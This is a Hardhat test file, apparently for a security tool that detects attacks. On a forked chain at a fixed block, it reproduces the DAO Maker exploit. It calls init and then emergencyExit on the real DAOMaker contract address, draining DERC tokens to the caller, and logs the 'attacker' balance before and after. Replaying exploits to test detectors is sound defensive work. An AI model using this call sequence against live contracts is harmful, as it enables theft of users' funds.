import { ethers } from 'hardhat'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'
import { DAOMaker, IERC20 } from '../typechain-types'
import { expect } from 'chai'

describe('CCA Detects DaoMaker Attack Test', async function () {
    let daomaker: DAOMaker
    let owner: SignerWithAddress
    let ownerAddress: string
    let DERC: IERC20

    beforeEach(async () => {
        owner = (await ethers.getSigners())[0]
        ownerAddress = await owner.getAddress()
        daomaker = await ethers.getContractAt('DAOMaker', '0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940')
        DERC = await ethers.getContractAt('IERC20', '0x9fa69536d1cda4A04cFB50688294de75B505a9aE')
    })

    it('should block number equal to 13_155_320', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(13_155_320)
    })

    it('should detect DaoMaker attack', async function () {
        const balanceBefore = await DERC.balanceOf(owner.address)
        console.log(`Before exploiting, Attacker DERC balance: ${ethers.formatUnits(balanceBefore, 18)}`)

        await daomaker
            .connect(owner)
            .init(1_640_984_401, [5_702_400], [10_000], '0x9fa69536d1cda4A04cFB50688294de75B505a9aE')

        await daomaker.connect(owner).emergencyExit(owner.address)

        const balanceAfter = await DERC.balanceOf(owner.address)
        console.log(`After exploiting, Attacker DERC balance: ${ethers.formatUnits(balanceAfter, 18)}`)

        expect(balanceAfter).to.be.gt(balanceBefore)
    })
})
